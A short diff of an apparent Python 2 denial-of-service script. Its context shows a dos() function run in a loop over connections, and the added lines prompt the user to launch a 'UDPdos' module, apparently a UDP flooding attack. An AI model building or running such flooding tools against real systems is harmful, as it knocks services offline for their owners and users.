@@ -30,3 +30,15 @@ def dos():
 	s.close()
 for i in xrange(conn):
 	dos()
+if 1 == 1:
+	print ""
+	print "Do you want to use APDOS?"
+	b = raw_input("yes/no >_ ")
+	if b == "yes":
+		import UDPdos
+		sys.exit()
+	if b == "y":
+		import UDPdos
+		sys.exit()
+	else:
+		sys.exit()
